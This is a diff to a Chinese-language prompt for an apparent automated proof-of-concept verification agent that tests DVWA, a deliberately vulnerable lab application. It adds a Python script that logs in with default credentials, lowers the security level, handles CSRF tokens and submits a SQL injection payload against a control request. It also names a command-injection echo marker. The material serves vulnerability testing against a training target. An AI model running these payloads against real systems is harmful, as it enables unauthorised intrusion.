@@ -613,22 +613,44 @@ EXECUTE_INSTRUCTIONS = """你是 POC 自动验证 Agent 的执行阶段。你的
 - browser_check：在隔离浏览器中加载页面，返回对话框、console 错误与截图。XSS 类结论必须
   用它观察到弹窗或页面求值结果；仅凭 HTTP 响应中的字符串不能算验证成功。
 
-标准库登录与两种 opener 的写法（这是交给 run_poc 的脚本内容，不是你的动作代码块）：
+标准库登录、切安全级别与表单提交的写法（这是交给 run_poc 的脚本内容，不是你的动作代码块）：
 
 ```python
-import urllib.request, urllib.error, urllib.parse, http.cookiejar, re
+import urllib.request, urllib.error, urllib.parse, http.cookiejar, re, os
 
-BASE = "http://dvwa"
+BASE = os.environ.get("DVWA_URL", "http://dvwa")
 jar = http.cookiejar.CookieJar()
+
+def token_from(html):
+    # 兼容 login/security/漏洞页单引号与双引号两种 token 写法。
+    match = re.search(r"name=['\"]user_token['\"]\\s+value=['\"]([^'\"]+)['\"]", html)
+    return match.group(1) if match else ""
 
 # 登录用会跟随重定向的 opener：登录成功后 DVWA 返回 302 到 index.php。
 login = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(jar))
 html = login.open(BASE + "/login.php", timeout=10).read().decode("utf-8", "replace")
-# 正则同时兼容 login 页的单引号与双引号两种 token 写法。
-token = re.search(r"name=['\"]user_token['\"]\\s+value=['\"]([^'\"]+)['\"]", html).group(1)
 login.open(BASE + "/login.php", timeout=10, data=urllib.parse.urlencode({
-    "username": "admin", "password": "password", "Login": "Login", "user_token": token,
+    "username": "admin", "password": "password", "Login": "Login",
+    "user_token": token_from(html),
 }).encode()).read()
+
+# 新会话默认安全级别是 impossible，攻击不会生效：登录后必须先用 /security.php 切到 low。
+sec = login.open(BASE + "/security.php", timeout=10).read().decode("utf-8", "replace")
+login.open(BASE + "/security.php", timeout=10, data=urllib.parse.urlencode({
+    "security": "low", "seclev_submit": "Submit", "user_token": token_from(sec),
+}).encode()).read()
+
+# DVWA 2.x 每个漏洞页表单都带页面级 user_token：POST 前先 GET 页面提取，连同攻击参数一起提交，
+# 否则表单不会执行查询（页面只是重新渲染菜单）。
+def form_post(path, fields):
+    page = login.open(BASE + path, timeout=10).read().decode("utf-8", "replace")
+    payload = urllib.parse.urlencode({**fields, "user_token": token_from(page)}).encode()
+    return login.open(BASE + path, timeout=10, data=payload).read().decode("utf-8", "replace")
+
+normal = form_post("/vulnerabilities/sqli/", {"id": "1", "Submit": "Submit"})
+attack = form_post("/vulnerabilities/sqli/", {"id": "1' OR '1'='1", "Submit": "Submit"})
+print("CONTROL", normal.count("ID: "), "rows")
+print("ATTACK", attack.count("ID: "), "rows")
 
 # 观测用禁止重定向的 opener，并与登录共用同一个 CookieJar。
 # handler 必须在 build_opener 时传入；事后再 add_handler 不会覆盖默认的跳转 handler。
@@ -652,14 +674,21 @@ print("ATTACK", location("/vulnerabilities/open_redirect/source/low.php?redirect
 - 先做正常请求（例如 id=1），再做攻击请求；两者输出都要保留，作为对照。
 - 每次执行都要把真正的命令行输出当作证据，不要编造；失败就换一种最小写法重试。
 
-适配要点（历史实测中反复导致验证失败的四种写法，必须避开）：
+适配要点（历史实测中反复导致验证失败的写法，必须避开）：
 - 登录自检：脚本每次请求后要确认已经处于登录态（例如 /index.php 响应含 Logout 或目标页面的
   表单/功能链接）。登录失败或把登录页当结果输出时不要硬跑攻击，先修正登录再重试；
   "脚本成功退出"不等于"验证成功"。
+- 安全级别：脚本自己的会话登录后默认是 impossible（DVWA 出厂默认），在这种级别下大多数攻击
+  （SQLi 参数化、命令注入被转义）不会生效；登录后必须先用 /security.php 把级别切到 low 再攻击。
+  宿主 prepare 记录的 security 属于宿主会话，脚本会话不会继承。
+- 表单 CSRF：DVWA 2.x 的每个漏洞页表单都带页面级 user_token；POST 攻击前必须先 GET 该页提取
+  user_token 一并提交，否则表单不执行查询（页面只是重新渲染菜单），攻击观测与正常观测会完全
+  相同而误判 rejected。
 - 对照优先：判断漏洞靠正常侧与攻击侧的**差异**，不是靠攻击响应里出现任何字符串。
-  SQLi 看结果行数/字段/报错的变化或唯一标记；命令注入看唯一回显标记
-  （例如 PWNED_$(id -u) 这种专属字符串，不要 grep "root"、"/bin/sh" 等常见词，避免正常侧误命中）；
-  XSS 必须用 browser_check 观察到弹窗或页面求值，HTTP 反射出来的 payload 不算。
+  SQLi 看结果行数/字段/报错的变化或唯一标记（例如行数从 1 变多、出现多条记录）；
+  命令注入看唯一回显标记（例如 PWNED_$(id -u) 这种专属字符串，不要 grep "root"、"/bin/sh" 等
+  常见词，避免正常侧误命中）；XSS 必须用 browser_check 观察到弹窗或页面求值，HTTP 反射出来
+  的 payload 不算。
 - payload 上下文：攻击 payload 必须适配目标页面的上下文（SQL 语句中的引号闭合、HTML 属性/标签
   位置、URL 编码规则）。不确定时先发一次正常请求观察回显结构，再构造 payload；一次不成立就换
   最小变体（如引号配对、注释符、编码方式），不要在一个错误 payload 上反复重试。
